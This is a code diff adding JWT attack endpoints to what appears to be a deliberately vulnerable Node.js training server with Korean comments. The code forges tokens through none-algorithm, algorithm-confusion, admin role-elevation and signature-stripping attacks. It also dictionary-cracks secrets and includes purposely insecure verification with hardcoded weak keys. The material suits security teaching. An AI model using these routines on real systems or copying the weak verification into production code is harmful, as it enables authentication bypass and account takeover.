@@ -3,6 +3,8 @@ const bodyParser = require('body-parser');
 const multer = require('multer');
 const fs = require('fs-extra');
 const JavaDeserializationVulnerability = require('./java-deserialization');
+const jwt = require('jsonwebtoken');
+const crypto = require('crypto');
 
 // Node.js deserialization vulnerability modules
 let nodeSerialize, serializeJavaScript, funcster;
@@ -877,9 +879,342 @@ print(json.dumps(result))
 `;
 }
 
+// JWT 취약점 테스트 엔드포인트
+app.post('/jwt', (req, res) => {
+    const { action, user, token, manipulation, vulnerable } = req.body;
+    
+    switch (action) {
+        case 'generate_jwt':
+            generateJWT(req, res, user, vulnerable);
+            break;
+        case 'manipulate_jwt':
+            manipulateJWT(req, res, token, manipulation);
+            break;
+        case 'verify_jwt':
+            verifyJWT(req, res, token, vulnerable);
+            break;
+        case 'crack_jwt':
+            crackJWT(req, res, token);
+            break;
+        default:
+            res.json({ success: false, error: 'Unknown JWT action' });
+    }
+});
+
+// JWT 생성 함수
+function generateJWT(req, res, user, vulnerable = true) {
+    try {
+        const payload = {
+            sub: user.id,
+            username: user.username,
+            role: user.role,
+            email: user.email,
+            iat: Math.floor(Date.now() / 1000),
+            exp: Math.floor(Date.now() / 1000) + (vulnerable ? 3600 * 24 : 900) // 취약한 경우 24시간, 안전한 경우 15분
+        };
+
+        let secret, algorithm, header;
+        const vulnerabilities = [];
+
+        if (vulnerable) {
+            // 🚨 취약한 JWT 설정
+            secret = 'secret123'; // 약한 비밀 키
+            algorithm = 'HS256';
+            header = { alg: algorithm, typ: 'JWT' };
+            
+            vulnerabilities.push('약한 비밀 키 사용 (secret123)');
+            vulnerabilities.push('긴 만료 시간 (24시간)');
+            vulnerabilities.push('알고리즘 검증 부재');
+            
+        } else {
+            // 🔒 안전한 JWT 설정
+            secret = crypto.randomBytes(64).toString('hex'); // 강력한 비밀 키
+            algorithm = 'HS256';
+            header = { alg: algorithm, typ: 'JWT' };
+            
+            // 추가 클레임
+            payload.iss = 'secure-app';
+            payload.aud = 'secure-users';
+        }
+
+        const token = jwt.sign(payload, secret, { algorithm, header });
+        
+        res.json({
+            success: true,
+            token: token,
+            header: header,
+            payload: payload,
+            secret: vulnerable ? secret : '[강력한 키로 보호됨]',
+            vulnerabilities: vulnerable ? vulnerabilities : undefined
+        });
+
+    } catch (error) {
+        res.json({ success: false, error: error.message });
+    }
+}
+
+// JWT 조작 함수
+function manipulateJWT(req, res, originalToken, manipulationType) {
+    try {
+        // JWT를 파싱 (서명 검증 없이)
+        const decoded = jwt.decode(originalToken, { complete: true });
+        
+        if (!decoded) {
+            return res.json({ success: false, error: 'Invalid JWT format' });
+        }
+
+        let manipulatedToken;
+        let changes = {};
+        let attackExplanation = '';
+
+        switch (manipulationType) {
+            case 'none_algorithm':
+                // None 알고리즘 공격
+                const noneHeader = { ...decoded.header, alg: 'none' };
+                const nonePayload = decoded.payload;
+                
+                // 수동으로 JWT 생성 (서명 없이)
+                const encodedHeader = Buffer.from(JSON.stringify(noneHeader)).toString('base64url');
+                const encodedPayload = Buffer.from(JSON.stringify(nonePayload)).toString('base64url');
+                manipulatedToken = `${encodedHeader}.${encodedPayload}.`;
+                
+                changes = { algorithm: 'HS256 → none', signature: 'removed' };
+                attackExplanation = 'None 알고리즘을 사용하여 서명 검증을 우회합니다. 서버가 알고리즘을 검증하지 않으면 조작된 토큰이 유효하다고 판단할 수 있습니다.';
+                break;
+
+            case 'algorithm_confusion':
+                // 알고리즘 혼동 공격 (RS256 → HS256)
+                const confusionHeader = { ...decoded.header, alg: 'HS256' };
+                const confusionPayload = decoded.payload;
+                
+                // 공개 키를 비밀 키로 사용 (시뮬레이션)
+                const fakeSecret = 'fake_public_key_as_secret';
+                manipulatedToken = jwt.sign(confusionPayload, fakeSecret, { header: confusionHeader });
+                
+                changes = { algorithm: 'RS256 → HS256', secret: 'public_key_as_secret' };
+                attackExplanation = '비대칭 알고리즘(RS256)을 대칭 알고리즘(HS256)으로 변경하고, 공개 키를 비밀 키로 사용합니다.';
+                break;
+
+            case 'role_elevation':
+                // 권한 상승 공격
+                const elevatedPayload = { ...decoded.payload, role: 'admin' };
+                const weakSecret = 'secret123'; // 약한 키 사용
+                manipulatedToken = jwt.sign(elevatedPayload, weakSecret, { header: decoded.header });
+                
+                changes = { role: `${decoded.payload.role} → admin` };
+                attackExplanation = '사용자 권한을 admin으로 상승시킵니다. 약한 비밀 키를 사용하여 새로운 서명을 생성합니다.';
+                break;
+
+            case 'expiry_extension':
+                // 만료 시간 연장
+                const extendedPayload = { 
+                    ...decoded.payload, 
+                    exp: Math.floor(Date.now() / 1000) + (365 * 24 * 3600) // 1년 연장
+                };
+                const extendSecret = 'secret123';
+                manipulatedToken = jwt.sign(extendedPayload, extendSecret, { header: decoded.header });
+                
+                changes = { 
+                    exp: `${new Date(decoded.payload.exp * 1000).toISOString()} → ${new Date(extendedPayload.exp * 1000).toISOString()}`
+                };
+                attackExplanation = '토큰 만료 시간을 1년으로 연장하여 장기간 사용 가능하게 만듭니다.';
+                break;
+
+            case 'signature_stripping':
+                // 서명 제거 공격
+                const parts = originalToken.split('.');
+                manipulatedToken = `${parts[0]}.${parts[1]}.`;
+                
+                changes = { signature: 'stripped' };
+                attackExplanation = 'JWT에서 서명 부분을 제거합니다. 서명 검증이 제대로 구현되지 않은 경우 토큰이 유효하다고 판단될 수 있습니다.';
+                break;
+
+            default:
+                return res.json({ success: false, error: 'Unknown manipulation type' });
+        }
+
+        res.json({
+            success: true,
+            manipulated_token: manipulatedToken,
+            original_token: originalToken,
+            changes: changes,
+            attack_explanation: attackExplanation,
+            manipulation_type: manipulationType
+        });
+
+    } catch (error) {
+        res.json({ success: false, error: error.message });
+    }
+}
+
+// JWT 검증 함수
+function verifyJWT(req, res, token, vulnerable = true) {
+    try {
+        let result = { success: true };
+
+        if (vulnerable) {
+            // 🚨 취약한 검증 (알고리즘 검증 없음)
+            try {
+                // 먼저 서명 없이 디코드
+                const decoded = jwt.decode(token, { complete: true });
+                
+                if (!decoded) {
+                    return res.json({ success: true, valid: false, reason: 'Invalid JWT format' });
+                }
+
+                // 취약한 검증: 알고리즘에 따라 다르게 처리
+                if (decoded.header.alg === 'none') {
+                    // None 알고리즘일 때 서명 검증 건너뛰기
+                    result.valid = true;
+                    result.decoded = decoded.payload;
+                    result.security_issues = [
+                        'None 알고리즘 허용으로 서명 검증 우회됨',
+                        '알고리즘 검증 부재',
+                        '조작된 토큰이 유효하다고 판단됨'
+                    ];
+                } else {
+                    // 약한 키로 검증 시도
+                    const weakSecrets = ['secret123', 'password', '123456', 'admin'];
+                    let verified = false;
+                    
+                    for (const secret of weakSecrets) {
+                        try {
+                            const verifiedPayload = jwt.verify(token, secret);
+                            result.valid = true;
+                            result.decoded = verifiedPayload;
+                            result.security_issues = [
+                                `약한 비밀 키로 검증됨: ${secret}`,
+                                '브루트포스 공격에 취약',
+                                '알고리즘 검증 부재'
+                            ];
+                            verified = true;
+                            break;
+                        } catch (e) {
+                            // 이 키로는 검증 실패, 다음 키 시도
+                        }
+                    }
+                    
+                    if (!verified) {
+                        result.valid = false;
+                        result.reason = '알려진 약한 키로 검증 실패';
+                    }
+                }
+
+            } catch (error) {
+                result.valid = false;
+                result.reason = error.message;
+            }
+
+        } else {
+            // 🔒 안전한 검증
+            try {
+                const strongSecret = crypto.randomBytes(64).toString('hex');
+                
+                // 안전한 검증 옵션
+                const verifyOptions = {
+                    algorithms: ['HS256'], // 허용된 알고리즘만
+                    clockTolerance: 30,    // 30초 클록 편차
+                    maxAge: '1h'           // 최대 1시간
+                };
+                
+                const decoded = jwt.verify(token, strongSecret, verifyOptions);
+                result.valid = true;
+                result.decoded = decoded;
+                
+            } catch (error) {
+                result.valid = false;
+                result.reason = `안전한 검증 실패: ${error.message}`;
+                
+                // 추가 보안 검사
+                const decodedUnsafe = jwt.decode(token, { complete: true });
+                if (decodedUnsafe) {
+                    const securityIssues = [];
+                    
+                    if (decodedUnsafe.header.alg === 'none') {
+                        securityIssues.push('None 알고리즘 감지 - 차단됨');
+                    }
+                    if (!decodedUnsafe.payload.exp || decodedUnsafe.payload.exp > Math.floor(Date.now() / 1000) + 3600) {
+                        securityIssues.push('만료 시간이 너무 길거나 설정되지 않음');
+                    }
+                    
+                    result.security_analysis = securityIssues;
+                }
+            }
+        }
+
+        res.json(result);
+
+    } catch (error) {
+        res.json({ success: false, error: error.message });
+    }
+}
+
+// JWT 크랙킹 함수
+function crackJWT(req, res, token) {
+    try {
+        const decoded = jwt.decode(token, { complete: true });
+        
+        if (!decoded) {
+            return res.json({ success: false, error: 'Invalid JWT format' });
+        }
+
+        if (decoded.header.alg === 'none') {
+            return res.json({
+                success: true,
+                cracked_secret: null,
+                crack_method: 'No secret needed (none algorithm)',
+                time_taken: '0ms',
+                attempts: ['None 알고리즘이므로 비밀 키 불필요']
+            });
+        }
+
+        const startTime = Date.now();
+        const commonSecrets = [
+            'secret', 'secret123', 'password', '123456', 'admin', 'test',
+            'key', 'jwt', 'token', 'auth', 'api', 'dev', 'prod',
+            'your-256-bit-secret', 'mysecretkey', 'secretkey'
+        ];
+        
+        const attempts = [];
+        
+        for (const secret of commonSecrets) {
+            attempts.push(`시도: ${secret}`);
+            try {
+                jwt.verify(token, secret);
+                const timeElapsed = Date.now() - startTime;
+                
+                return res.json({
+                    success: true,
+                    cracked_secret: secret,
+                    crack_method: 'Dictionary attack',
+                    time_taken: `${timeElapsed}ms`,
+                    attempts: attempts
+                });
+                
+            } catch (e) {
+                // 이 키는 맞지 않음, 계속 시도
+            }
+        }
+
+        const timeElapsed = Date.now() - startTime;
+        res.json({
+            success: true,
+            cracked_secret: null,
+            crack_method: 'Dictionary attack failed',
+            time_taken: `${timeElapsed}ms`,
+            attempts: attempts,
+            message: '사전 공격으로 크랙할 수 없음. 더 강력한 브루트포스나 다른 방법이 필요합니다.'
+        });
+
+    } catch (error) {
+        res.json({ success: false, error: error.message });
+    }
+}
+
 app.listen(port, () => {
     console.log(`🚀 Node.js Vulnerability Testing Suite listening at http://localhost:${port}`);
     console.log(`📊 Prototype Pollution endpoint: POST /prototype_pollution`);
     console.log(`☕ Java Deserialization endpoints: /java/*`);
     console.log(`🐍 Python Pickle endpoints: POST /pickle`);
+    console.log(`🔐 JWT Vulnerabilities endpoints: POST /jwt`);
 });
